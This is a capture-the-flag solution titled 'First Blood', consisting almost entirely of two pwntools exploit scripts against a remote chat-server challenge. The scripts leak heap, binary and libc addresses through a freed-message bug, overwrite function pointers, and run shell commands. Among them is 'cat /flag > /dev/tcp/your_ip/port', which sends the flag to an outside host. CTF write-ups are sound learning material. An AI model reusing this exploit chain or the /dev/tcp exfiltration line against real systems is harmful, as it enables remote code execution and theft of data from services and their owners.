First Blood
For more stability to exploit remote, choose to use two clients in my EXP
client1:
```
from pwn import *
import time
def msg(ty,bo,le):
    return p32(le+8)+p64(ty)+bo

def register(username):
     p.send(p32(len(username)+0x8+8))
     p.send(p64(0))
     p.send(p64(len(username))+username)

def addchat(username,chatname):
     p.send(p32(len(username)+len(chatname)+0x10+8))
     p.send(p64(1))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname)

def joinchat(username,chatname):
     p.send(p32(len(username)+len(chatname)+0x10+8))
     p.send(p64(2))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname)

def sendmsg(username,chatname,msg):
     p.send(p32(len(username)+len(chatname)+len(msg)+0x18+8))
     p.send(p64(3))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname+p64(len(msg))+msg)

def editmsg(username,chatname,index,msg):
     p.send(p32(len(username)+len(chatname)+len(msg)+0x20+8))
     p.send(p64(4))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname+index+p64(len(msg))+msg)

def deletemsg(username,chatname,index):
     p.send(p32(len(username)+len(chatname)+0x18+8))
     p.send(p64(5))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname+index)

def forwardmsg(username,chatname,index):
     p.send(p32(len(username)+len(chatname)+len(msg)+0x20+8))
     p.send(p64(6))
     p.send(p64(len(username))+username+p64(len(chatname))+chatname+p64(len(msg))+msg+index)

def getmsg(chatname,index):
     p.send(p32(len(chatname)+0x10+8))
     p.send(p64(7))
     p.send(p64(len(chatname))+chatname+index)

def listmsg(chatname):
     p.send(p32(len(chatname)+8+8))
     p.send(p64(8))
     p.send(p64(len(chatname))+chatname)

context.log_level="debug"
p=remote("34.77.235.192",41646)
register("kirin")
time.sleep(2)
addchat("kirin","1111")
time.sleep(2)
sendmsg("kirin","1111","a"*0x20)
time.sleep(2)
p.recv(1024)
listmsg("1111")
s=p.recvuntil("\x7f")[-6:]
magic=u64(s+"\x00\x00")
print hex(magic)
deletemsg("kirin","1111",p64(magic))
p.interactive()
```
client2:
```
magic=#input client1's magic
context.log_level="debug"
p=remote("34.77.235.192",38597)
#editmsg("kirin","1111",p64(0x7f5318000d00),"8"*0x10)
#getmsg("1111",p64(0x7f0768000d00))

sendmsg("kirin","1111","8"*0x90)
time.sleep(2)
p.recv(1024)
getmsg("1111",p64(magic))
time.sleep(2)
p.recvuntil("kirin")
p.recv(8)
base=u64(p.recv(8))-0x22e840
print hex(base)
editmsg("kirin","1111",p64(magic),p64(base+0x22e840)+p64(base+0x22EDD0))
time.sleep(2)
p.recv(1024)
getmsg("1111",p64(magic+0x30))
time.sleep(2)
p.recvuntil("kirin")
p.recv(8)
libc=u64(p.recv(8))-0x00064e10
print hex(libc)
editmsg("kirin","1111",p64(magic),p64(base+0x22e840)+p64(libc+0x01eeb28))
time.sleep(2)
editmsg("kirin","1111",p64(magic+0x30),p64(libc+0x0055410))
time.sleep(2)
sendmsg("kirin","1111",'echo "cat /flag > /dev/tcp/your_ip/port" > ./1.sh\x00')
p.recv()
sendmsg("kirin","1111",'chmod +x ./1.sh\x00')
p.recv()
sendmsg("kirin","1111",'bash ./1.sh\x00')
p.interactive()
```